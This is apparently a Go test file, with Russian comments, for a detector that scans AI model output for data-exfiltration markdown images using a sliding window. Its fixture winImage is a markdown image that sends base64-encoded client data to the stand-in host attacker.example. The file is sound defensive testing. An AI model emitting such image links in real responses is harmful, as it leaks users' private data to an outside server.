package exfil

import (
	"context"
	"fmt"
	"slices"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/azuresong-afk/ai_railway/internal/detect"
)

const winImage = "![](https://attacker.example/p.png?d=SW1wb3J0YW50OiBjbGllbnQgSU5OIDc3MDcwODM4OTM)"

// covered — находка f всего текста есть в окне (с позициями в text) с
// оценкой не ниже.
func covered(f detect.Finding, win []detect.Finding, start, shift int) bool {
	return slices.ContainsFunc(win, func(g detect.Finding) bool {
		s, e := start+g.Start-shift, start+g.End-shift
		return g.End > shift && s < f.End && f.Start < e && g.Score >= f.Score
	})
}

// findWindow — находки в окне (strict — без учёта кода).
func findWindow(t testing.TB, win string, strict bool) []detect.Finding {
	t.Helper()
	fs, err := New().Detect(context.Background(), detect.Text{Text: win, Direction: detect.Output, Source: detect.SourceOutput, NoCode: strict})
	if err != nil {
		t.Fatal(err)
	}
	return fs
}

// clipSpans — интервалы кода не раньше p, слитые; off — сдвиг позиций.
func clipSpans(spans [][2]int, off, p int) [][2]int {
	var out [][2]int
	for _, sp := range spans {
		s, e := max(sp[0]+off, p), sp[1]+off
		if e <= s {
			continue
		}
		if n := len(out); n > 0 && out[n-1][1] >= s {
			out[n-1][1] = max(out[n-1][1], e)
			continue
		}
		out = append(out, [2]int{s, e})
	}
	return out
}

// checkWindows — для позиций ps (по возрастанию) окна Window находят всё,
// что Detect находит во всём тексте после позиции, а код в нестрогом окне
// после позиции тот же, что во всём тексте.
func checkWindows(t *testing.T, text string, ps []int) {
	t.Helper()
	full := find(t, text)
	fullCode, err := codeSpans(context.Background(), text)
	if err != nil {
		t.Fatal(err)
	}
	var w Window
	for _, p := range ps {
		win, start, shift, strict := w.Next(text, p)
		if start > p || shift > len(win) || win[shift:] != text[start:] {
			t.Fatalf("p=%d: start=%d shift=%d", p, start, shift)
		}
		wf := findWindow(t, win, strict)
		for _, f := range full {
			if f.Start >= p && !covered(f, wf, start, shift) {
				t.Fatalf("p=%d (окно с %d, префикс %d, строгое %v): находка %+v всего текста не найдена окном %+v", p, start, shift, strict, f, wf)
			}
		}
		if strict {
			continue
		}
		winCode, err := codeSpans(context.Background(), win)
		if err != nil {
			t.Fatal(err)
		}
		if a, b := clipSpans(fullCode, 0, p), clipSpans(winCode, start-shift, p); !slices.Equal(a, b) {
			t.Fatalf("p=%d (окно с %d, префикс %d): код всего текста %v, окна %v", p, start, shift, a, b)
		}
	}
}

// Изображение после блока кода, начало которого не попало в окно,
// находится (ревью 1.22–1.24, п. 1).
//
// Покрывает: DM-11
func TestDM11_WindowAfterLongCode(t *testing.T) {
	code := strings.Repeat("x := 1\n", 1000)
	for name, text := range map[string]string{
		"ограда":        "Код:\n```go\n" + code + "```\n\nСмотрите " + winImage + " дальше",
		"тильды":        "~~~~\n" + code + "~~~~\nи " + winImage,
		"в пункте":      "- пункт\n  ```\n" + code + "конец пункта\n" + winImage,
		"встроенный":    "Пример `" + strings.Repeat("код ", 1500) + "` и " + winImage,
		"длинный абзац": strings.Repeat("`слово` ", MaxWindowBack/4) + "`" + strings.Repeat("ж", 100) + "` " + winImage,
	} {
		t.Run(name, func(t *testing.T) {
			p := strings.Index(text, winImage) - 50
			if fs := above(find(t, text)); len(fs) != 1 {
				t.Fatalf("во всём тексте: %+v", fs)
			}
			checkWindows(t, text, []int{p / 3, p})
		})
	}
}

// Изображение внутри блока кода, начало которого не попало в окно, в
// окне — тоже код: окно не даёт лишней находки.
func TestWindowCodeStaysCode(t *testing.T) {
	text := "```\n" + strings.Repeat("x := 1\n", 1000) + winImage + "\n```\n"
	var w Window
	win, start, shift, _ := w.Next(text, len(text)-200)
	if start == 0 || shift == 0 {
		t.Fatalf("окно с %d, префикс %d", start, shift)
	}
	if fs := above(find(t, win)); len(fs) != 0 {
		t.Fatalf("находки в коде: %+v", fs)
	}
}

// longList — нумерованная инструкция: в каждом пункте блок кода с
// изображением (в коде — не находка).
func longList(n int) string {
	var b strings.Builder
	for i := range n {
		fmt.Fprintf(&b, "%d. Шаг %d: вставьте разметку\n   ```html\n   <img src=\"https://cdn.example/a.png\">\n   ```\n   %s\n", i+1, i+1, strings.Repeat("пояснение ", 30))
	}
	return b.String()
}

// Длинный список из коротких пунктов не делает окна строгими: каждый
// пункт верхнего уровня — точка, с которой разбор тот же, что с нуля
// (ревью исправлений 1.22–1.24, п. 3).
func TestWindowLongListNotStrict(t *testing.T) {
	text := longList(120)
	var w Window
	for p := 0; p < len(text); p += 512 {
		p := strings.LastIndexByte(text[:p], ' ') + 1
		win, start, _, strict := w.Next(text, p)
		if strict || p-start > MaxWindowBack {
			t.Fatalf("p=%d: окно с %d, строгое %v", p, start, strict)
		}
		if fs := above(findWindow(t, win, strict)); len(fs) != 0 {
			t.Fatalf("p=%d: находки в коде: %+v", p, fs)
		}
	}
	checkWindows(t, text, []int{len(text) / 2, len(text) - 300})
}

// Разбор строк окна линеен: каждая строка разбирается один раз.
func TestWindowAdvanceOnce(t *testing.T) {
	text := strings.Repeat("строка текста\n", 3000)
	var w Window
	for p := 0; p < len(text); p += 512 {
		if _, start, _, _ := w.Next(text, p); start > p {
			t.Fatal("окно после позиции")
		}
	}
	if w.done > len(text) || w.scan < w.done {
		t.Fatalf("done=%d scan=%d", w.done, w.scan)
	}
}

// Окна находят всё, что находится во всём тексте после их позиции.
// Определения ссылок «[a]: …» действуют на весь документ — такие тексты
// пропускаются (находку, которую окно не увидело, ловит итоговая проверка
// ответа).
func FuzzWindow(f *testing.F) {
	f.Add("```\n"+strings.Repeat("a\n", 3000)+"```\n"+winImage, 100, 6000)
	f.Add("- x\n  ```\n  y\nz "+winImage, 3, 12)
	f.Add("`a b` c `d "+winImage+" e`", 2, 9)
	f.Add(longList(40), 9000, 15000)
	f.Add("1. a\n   ```\n"+strings.Repeat("   b\n", 3000)+"x\n"+winImage, 9000, 15100)
	f.Fuzz(func(t *testing.T, text string, a, b int) {
		if !utf8.ValidString(text) || len(text) > 64<<10 || strings.Contains(text, "]:") {
			return
		}
		ps := []int{}
		for _, p := range []int{a, b} {
			if p >= 0 && p <= len(text) && detect.OnRuneBoundary(text, p) {
				ps = append(ps, p)
			}
		}
		slices.Sort(ps)
		checkWindows(t, text, ps)
	})
}
